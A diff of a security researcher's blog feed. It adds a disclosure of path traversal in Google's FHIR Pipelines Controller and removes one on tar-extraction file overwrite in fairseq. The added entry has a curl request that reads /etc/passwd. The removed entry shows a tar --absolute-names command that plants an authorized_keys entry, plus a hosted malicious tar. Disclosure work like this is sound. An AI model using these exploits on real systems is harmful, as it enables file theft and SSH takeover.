@@ -1,7 +1,155 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-11T22:28:26+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Store XSS in gitness markdown comment editor</title><link href="http://localhost:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer.html" rel="alternate" type="text/html" title="Store XSS in gitness markdown comment editor" /><published>2024-05-11T10:31:06+08:00</published><updated>2024-05-11T10:31:06+08:00</updated><id>http://localhost:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer</id><content type="html" xml:base="http://localhost:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer.html"><![CDATA[<h2 id="name">Name</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-18T11:13:29+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Google: Local File Inclusion in FHIR Pipelines Controller</title><link href="http://localhost:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html" rel="alternate" type="text/html" title="Google: Local File Inclusion in FHIR Pipelines Controller" /><published>2024-05-16T10:31:06+08:00</published><updated>2024-05-16T10:31:06+08:00</updated><id>http://localhost:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control</id><content type="html" xml:base="http://localhost:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
-  <p>Store XSS in gitness markdown comment editor</p>
+  <p>Local File Inclusion in FHIR Pipelines Controller</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>A local file inclusion is present in the FHIR Pipelines Controller when fetching error log file under the <code class="language-plaintext highlighter-rouge">/download?path=</code> route.</p>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115">route</a> <code class="language-plaintext highlighter-rouge">/download</code> is used for fetching error log if <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/resources/templates/index.html#L241">pipeline run failed</a>. However, the <code class="language-plaintext highlighter-rouge">path</code> parameter is not limited to <code class="language-plaintext highlighter-rouge">dwhRoot</code> folder causing any file on the filesystem can be read.</p>
+
+<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115">spring boot rest controller</a> to download the log file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@GetMapping(
+      value = "/download",
+      produces = {MediaType.TEXT_PLAIN_VALUE})
+public ResponseEntity&lt;InputStreamResource&gt; download(@RequestParam(name = "path") String path)
+      throws IOException {
+    ResourceId resourceId = FileSystems.matchNewResource(path, false);
+    ReadableByteChannel channel = FileSystems.open(resourceId);
+    InputStream stream = Channels.newInputStream(channel);
+    InputStreamResource inputStreamResource = new InputStreamResource(stream);
+    MultiValueMap&lt;String, String&gt; headers = new HttpHeaders();
+    headers.put("Content-type", Arrays.asList(MediaType.TEXT_PLAIN_VALUE));
+    return new ResponseEntity&lt;&gt;(inputStreamResource, headers, HttpStatus.OK);
+}
+</code></pre></div></div>
+
+<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/resources/templates/index.html#L241">frontend view</a> to fetch log file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;div th:unless="${#strings.isEmpty(lastRunDetails.logFilePath)}"&gt;
+    Last run failed! Please find error logs here
+    &lt;button type="submit"
+            class="button btn btn-primary" th:onclick="openLogs([[${lastRunDetails.logFilePath}]])"&gt;
+        View Raw Logs
+    &lt;/button&gt;
+&lt;/div&gt;
+</code></pre></div></div>
+<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/resources/templates/index.html#L18">javascript function openLogs</a> to fetch the file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function openLogs(logPath) {
+    const url = "/download?path="+logPath;
+    // Encode the special characters in the url
+    const encodedURL = encodeURI(url);
+    window.open(encodedURL, '_blank').focus();
+}
+</code></pre></div></div>
+
+<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/PipelineManager.java#L757">log file path</a> <code class="language-plaintext highlighter-rouge">logFilePath</code> is supposed to <code class="language-plaintext highlighter-rouge">dwhRoot + ERROR_FILE_NAME</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>String fileSeparator = DwhFiles.getFileSeparatorForDwhFiles(dwhRoot);
+dwhRoot = dwhRoot.endsWith(fileSeparator) ? dwhRoot : dwhRoot + fileSeparator;
+ResourceId errorResource = FileSystems.matchNewResource(dwhRoot + ERROR_FILE_NAME, false);
+if (dwhFilesManager.doesFileExist(errorResource)) {
+    dwhRunDetails.setLogFilePath(dwhRoot + ERROR_FILE_NAME);
+}
+</code></pre></div></div>
+
+<h3 id="steps-to-reproduce">Steps to reproduce</h3>
+
+<p>Following the official <a href="https://github.com/google/fhir-data-pipes/wiki/Try-out-the-FHIR-Pipelines-Controller#set-up-the-test-server">tutorial</a> to set up the HAPI FHIR server and the FHIR Pipelines Controller service:</p>
+
+<ol>
+  <li>
+    <p>Clone the fhir-data-pipes repository.</p>
+  </li>
+  <li>
+    <p>Set up a local HAPI FHIR server using docker:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> docker network create cloudbuild
+ docker-compose  -f ./docker/hapi-compose.yml up  --force-recreate -d
+</code></pre></div>    </div>
+    <p>The base URL for this server is http://localhost:8098/fhir.</p>
+  </li>
+  <li>
+    <p>Open <a href="https://github.com/google/fhir-data-pipes/blob/master/pipelines/controller/config/application.yaml">pipelines/controller/config/application.yml</a> in a text editor. Change <code class="language-plaintext highlighter-rouge">fhirServerUrl</code> to be:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> fhirServerUrl: "http://localhost:8091/fhir"
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Open <a href="https://github.com/google/fhir-data-pipes/blob/master/pipelines/controller/config/hapi-postgres-config.json">pipelines/controller/config/hapi-postgres-config.json</a>. Change <code class="language-plaintext highlighter-rouge">databaseHostName</code> to be:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> "databaseHostName" : "localhost"
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Build the fhir-data-pipes service. In fhir-data-pipes root directory, run following:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> cd fhir-data-pipes-master
+ mvn install -Dlicense.skip=true
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>After built successfully, <code class="language-plaintext highlighter-rouge">pipelines/controller/target/controller-bundled.jar</code> is generated. Run the server in <code class="language-plaintext highlighter-rouge">pipelines/controller/</code> directory:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> cd pipelines/controller/
+ java -jar target/controller-bundled.jar
+</code></pre></div>    </div>
+    <p>After service up, the FHIR Pipelines Controller will listen on <code class="language-plaintext highlighter-rouge">http://0.0.0.0:8080</code>. Open the webpage <code class="language-plaintext highlighter-rouge">http://0.0.0.0:8080</code> in browser, We can see FHIR Pipelines Control Panel. Send following request to <code class="language-plaintext highlighter-rouge">/download</code> route:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> curl http://10.15.0.5:8080/download?path=/etc/passwd
+</code></pre></div>    </div>
+
+    <p>The output is the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> root:x:0:0:root:/root:/bin/bash
+ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+ bin:x:2:2:bin:/bin:/usr/sbin/nologin
+ sys:x:3:3:sys:/dev:/usr/sbin/nologin
+ sync:x:4:65534:sync:/bin:/bin/sync
+ games:x:5:60:games:/usr/games:/usr/sbin/nologin
+ man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+ lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+ mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+ news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+ uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+ proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+ www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+ backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+ list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+ irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+ gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+ _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h2 id="impact">Impact</h2>
+
+<p>Any file on the backend filesystem can be read by an attacker with access to the FHIR Pipelines Controller service.</p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115">https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115</a></p>]]></content><author><name></name></author><category term="file-inclusion" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Store XSS in Gitness markdown comment editor</title><link href="http://localhost:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer.html" rel="alternate" type="text/html" title="Store XSS in Gitness markdown comment editor" /><published>2024-05-11T10:31:06+08:00</published><updated>2024-05-11T10:31:06+08:00</updated><id>http://localhost:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer</id><content type="html" xml:base="http://localhost:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Store XSS in Gitness markdown comment editor</p>
 </blockquote>
 
 <h2 id="weakness">Weakness</h2>
@@ -1222,208 +1370,4 @@ On servers hosting web servers, various vulnerabilities can be exploited. On PHP
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/onnx/onnx/blob/4128a09009aa67622c6308c82fe4199813a71682/onnx/hub.py#L369">https://github.com/onnx/onnx/blob/4128a09009aa67622c6308c82fe4199813a71682/onnx/hub.py#L369</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Arbitrary File Overwrite and Arbitrary Folder Delete in from_pretrained api</title><link href="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-facebook-fairseq.html" rel="alternate" type="text/html" title="Arbitrary File Overwrite and Arbitrary Folder Delete in from_pretrained api" /><published>2024-04-07T10:31:06+08:00</published><updated>2024-04-07T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-facebook-fairseq</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-facebook-fairseq.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Arbitrary File Overwrite in from_pretrained api in facebook fairseq</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>CWE-22: Path Traversal</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>High (8.8)</p>
-</blockquote>
-
-<h2 id="description">Description</h2>
-
-<p>The <a href="https://fairseq.readthedocs.io/en/latest/models.html?highlight=from_pretrained#fairseq.models.BaseFairseqModel.from_pretrained">from_pretrained</a> function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. This leads directly to a high impact regarding the integrity of files. An attacker could also abuse this to impact the availability, by deleting system files, personal files, or application files. Remote code execution is also possible through various means.</p>
-
-<p>The vulnerable function is exposed through the <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/models/fairseq_model.py#L272">BaseFairseqModel.from_pretrained</a> function. It’s an api used to read pretrained from files on disk, S3 path, or URL which is tar file.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def from_pretrained(
-        cls,
-        model_name_or_path,
-        checkpoint_file="model.pt",
-        data_name_or_path=".",
-        **kwargs,
-    ):
-        from fairseq import hub_utils
-
-        x = hub_utils.from_pretrained(
-            model_name_or_path,
-            checkpoint_file,
-            data_name_or_path,
-            archive_map=cls.hub_models(),
-            **kwargs,
-        )
-        logger.info(x["args"])
-        return hub_utils.GeneratorHubInterface(x["args"], x["task"], x["models"])
-</code></pre></div></div>
-
-<p>and then it calls <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/hub_utils.py#L23">hub_utils.from_pretrained</a>, in this function, it calls <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L54">file_utils.load_archive_file</a> to download file from <code class="language-plaintext highlighter-rouge">model_name_or_path</code></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def from_pretrained(
-    model_name_or_path,
-    checkpoint_file="model.pt",
-    data_name_or_path=".",
-    archive_map=None,
-    **kwargs
-):
-    ...
-    model_path = file_utils.load_archive_file(model_name_or_path)
-</code></pre></div></div>
-
-<p>in <code class="language-plaintext highlighter-rouge">file_utils.load_archive_file</code>, it calls <code class="language-plaintext highlighter-rouge">file_utils.cached_path</code> firstly:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def load_archive_file(archive_file):
-    # redirect to the cache, if necessary
-    try:
-        resolved_archive_file = cached_path(archive_file, cache_dir=None)
-    except EnvironmentError:
-        logger.info(
-            "Archive name '{}' was not found in archive name list. "
-            "We assumed '{}' was a path or URL but couldn't find any file "
-            "associated to this path or URL.".format(
-                archive_file,
-                archive_file,
-            )
-        )
-        return None
-
-    if resolved_archive_file == archive_file:
-        logger.info("loading archive file {}".format(archive_file))
-    else:
-        logger.info(
-            "loading archive file {} from cache at {}".format(
-                archive_file, resolved_archive_file
-            )
-        )
-
-    # Extract archive to temp dir and replace .tar.bz2 if necessary
-    tempdir = None
-    if not os.path.isdir(resolved_archive_file):
-        tempdir = tempfile.mkdtemp()
-        logger.info(
-            "extracting archive file {} to temp dir {}".format(
-                resolved_archive_file, tempdir
-            )
-        )
-        ext = os.path.splitext(archive_file)[1][1:]
-        with tarfile.open(resolved_archive_file, "r:" + ext) as archive:
-            top_dir = os.path.commonprefix(archive.getnames())
-            archive.extractall(tempdir)
-        os.remove(resolved_archive_file)
-        shutil.move(os.path.join(tempdir, top_dir), resolved_archive_file)
-        shutil.rmtree(tempdir)
-
-    return resolved_archive_file
-</code></pre></div></div>
-
-<p>and then in <code class="language-plaintext highlighter-rouge">file_utils.cached_path</code>, when parmeter <code class="language-plaintext highlighter-rouge">url_or_filename</code> is an url, it calls <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L279">file_utils.get_from_cache</a> to download tar file and save file content in temperary file and return the temperary file path to <code class="language-plaintext highlighter-rouge">file_utils.load_archive_file</code>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def get_from_cache(url, cache_dir=None):
-    ...    
-    cache_path = os.path.join(cache_dir, filename)
-    if not os.path.exists(cache_path):
-        # Download to temporary file, then copy to cache dir once finished.
-        # Otherwise you get corrupt cache entries if the download gets interrupted.
-        with tempfile.NamedTemporaryFile() as temp_file:
-            logger.info("%s not found in cache, downloading to %s", url, temp_file.name)
-
-            # GET file object
-            if url.startswith("s3://"):
-                s3_get(url, temp_file)
-            else:
-                ##### Download tar file from url!!!!! #####
-                http_get(url, temp_file)
-
-            # we are copying the file before closing it, so flush to avoid truncation
-            temp_file.flush()
-            # shutil.copyfileobj() starts at the current position, so go to the start
-            temp_file.seek(0)
-    ...
-    return cache_path
-</code></pre></div></div>
-
-<p>Back to <code class="language-plaintext highlighter-rouge">file_utils.load_archive_file</code>, the malicious tar file is opened by <code class="language-plaintext highlighter-rouge">tarfile.open</code> and extracted by <code class="language-plaintext highlighter-rouge">archive.extractall</code> without any security checks which is well-known vulnerability. when tar file is compressed by <code class="language-plaintext highlighter-rouge">tar</code> option <code class="language-plaintext highlighter-rouge">--absolute-names</code>, absolute path names and relative path names can be included in tar file. When extracted by <code class="language-plaintext highlighter-rouge">tarfile.extractall</code>, the file with absolute names will overwrite target files silently, causing arbitrary file overwite.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def load_archive_file(archive_file):
-    ...
-    # Extract archive to temp dir and replace .tar.bz2 if necessary
-    tempdir = None
-    if not os.path.isdir(resolved_archive_file):
-        tempdir = tempfile.mkdtemp()
-        logger.info(
-            "extracting archive file {} to temp dir {}".format(
-                resolved_archive_file, tempdir
-            )
-        )
-        ext = os.path.splitext(archive_file)[1][1:]
-        with tarfile.open(resolved_archive_file, "r:" + ext) as archive:
-            top_dir = os.path.commonprefix(archive.getnames())
-            archive.extractall(tempdir)
-        os.remove(resolved_archive_file)
-        shutil.move(os.path.join(tempdir, top_dir), resolved_archive_file)
-        shutil.rmtree(tempdir)
-
-    return resolved_archive_file
-</code></pre></div></div>
-
-<p>During the testing, I found the file to be overwrite is missing. By reading the source code carefully, it uses <code class="language-plaintext highlighter-rouge">shutil.move</code> to move files extracted to <code class="language-plaintext highlighter-rouge">resolved_archive_file</code> target. The move source is from <code class="language-plaintext highlighter-rouge">os.path.join(tempdir, top_dir)</code> and <code class="language-plaintext highlighter-rouge">top_dir</code> is from <code class="language-plaintext highlighter-rouge">os.path.commonprefix(archive.getnames())</code>. Well, this is controlled by attacker, in <a href="https://docs.python.org/3/library/os.path.html#os.path.commonprefix">Python documents</a>, when list contains both abs and relative pathnames, it will return empty string in which attacker can include abs and relative names in tar file, and then <code class="language-plaintext highlighter-rouge">move</code> source will be <code class="language-plaintext highlighter-rouge">tempdir</code> which bypass the <code class="language-plaintext highlighter-rouge">shutil.move</code>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; os.path.commonprefix(['/home/kali/.ssh/xx', '404.html'])
-  ''
-&gt; os.path.join("/root/tmp/","")
-  '/root/tmp/'
-</code></pre></div></div>
-
-<h2 id="proof-of-concept">Proof of Concept</h2>
-
-<p>An attacker can create a malicous tar file using following command:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -cvf hack.tar /home/kali/.ssh/authorized_keys 404.html
-</code></pre></div></div>
-
-<p>Then, the attacker will upload the <code class="language-plaintext highlighter-rouge">hack.tar</code> to public server.</p>
-
-<p>I have uploaded one malicous tar file for testing: <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack-abs-and-relative.tar">https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack-abs-and-relative.tar</a></p>
-
-<p>If anyone now downloads tar using <code class="language-plaintext highlighter-rouge">from_pretrained</code> api, causing automatically extracting the malicous tar file and overwrite files silently.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from fairseq.models.transformer import TransformerModel
-model = TransformerModel.from_pretrained('https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack-abs-and-relative.tar')
-</code></pre></div></div>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; cat /home/kali/.ssh/authorized_keys
-ssh-rsa xxx hacker@test.com
-</code></pre></div></div>
-
-<p>Tested on Google Colab: <a href="https://colab.research.google.com/drive/1AY9iqw_FdTvMGoqaDseX8jCnSGV9qCq6?usp=sharing">https://colab.research.google.com/drive/1AY9iqw_FdTvMGoqaDseX8jCnSGV9qCq6?usp=sharing</a></p>
-
-<p><img src="https://live.staticflickr.com/65535/53639482085_b57cae8712_k.jpg" alt="poc" /></p>
-
-<h2 id="impact">Impact</h2>
-
-<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
-
-<h3 id="ssh-access">SSH Access</h3>
-
-<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
-
-<h3 id="web-servers">Web Servers</h3>
-
-<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
-
-<h2 id="reference">Reference</h2>
-
-<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>
-
-<h2 id="occurrences">Occurrences</h2>
-
-<p><a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90">https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
+<p><a href="https://github.com/onnx/onnx/blob/4128a09009aa67622c6308c82fe4199813a71682/onnx/hub.py#L369">https://github.com/onnx/onnx/blob/4128a09009aa67622c6308c82fe4199813a71682/onnx/hub.py#L369</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
